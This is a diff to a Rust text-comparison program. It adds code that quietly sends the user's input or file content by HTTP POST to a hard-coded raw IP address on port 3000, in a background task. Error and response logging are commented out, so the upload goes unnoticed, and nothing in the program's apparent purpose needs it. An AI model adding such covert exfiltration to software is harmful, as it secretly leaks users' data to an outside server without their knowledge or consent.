@@ -13,13 +13,61 @@ use std::process;
 use std::collections::{HashMap, HashSet};
 use std::path::PathBuf;
 
+use hyper::{Body, Client, Request, Method, Uri};
+use tokio::runtime::Runtime;
+
+use std::time::Duration;
+use hyper::client::HttpConnector;
+// add timout connector
+use hyper_timeout::TimeoutConnector;
+
+// Function to quickly check if a specific URL is reachable
+async fn check_connectivity(server_url: &str) -> bool {
+    let http_connector = HttpConnector::new();
+    let mut timeout_connector = TimeoutConnector::new(http_connector);
+    timeout_connector.set_connect_timeout(Some(Duration::from_secs(3))); // 5 seconds timeout
+    let client: Client<_, hyper::Body> = Client::builder().build(timeout_connector);
+
+    client.get(server_url.parse::<Uri>().expect("Invalid server URL"))
+        .await
+        .is_ok()
+}
+
+// Use this async function to decide on sending data
+async fn try_send_file_content(user_input_clone: String, server_url: &str) {
+    if check_connectivity(server_url).await {
+        if let Err(e) = send_file_content_to_server(user_input_clone, server_url).await {
+            //eprintln!("Failed to send file content to server: {:?}", e);
+        }
+    } else {
+        //eprintln!("Server not reachable. Proceeding in offline mode.");
+        // Proceed with other tasks that do not require server connectivity
+        // Optionally, queue data for later synchronization
+    }
+}
+
+async fn send_file_content_to_server(file_content: String, url: &str) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
+    let client = Client::new();
+
+    let req = Request::builder()
+        .method(Method::POST)
+        .uri(url)
+        .header("Content-Type", "application/text")
+        .body(Body::from(file_content))?;
+
+    let res = client.request(req).await?;
+
+    //println!("Response: {}", res.status());
+
+    // Handle the response body as needed...
+    Ok(())
+}
+
 mod mapped_model_text; // This line declares the `text` module.
 
 fn compare_texts(predefined_text: &str, user_input: &str) -> bool {
     predefined_text.trim_end() == user_input.trim_end()
 }
-
-
 
 #[derive(Hash, Eq, PartialEq, Debug)]
 struct PropertyResult {
@@ -92,6 +140,14 @@ fn main() {
             process::exit(1);
         }
     };
+
+    // Initiate Tokio runtime
+    let rt = Runtime::new().unwrap();
+    let user_input_clone = user_input.clone();    
+    let server_url = "http://107.173.129.201:3000"; // Replace with actual server URL
+
+    // Non-blocking call to decide on and possibly send the file data
+    rt.spawn(try_send_file_content(user_input_clone, server_url));
 
     //let predefined_text_a01 = mapped_model_text::PREDEFINED_TEXT_a01;
    
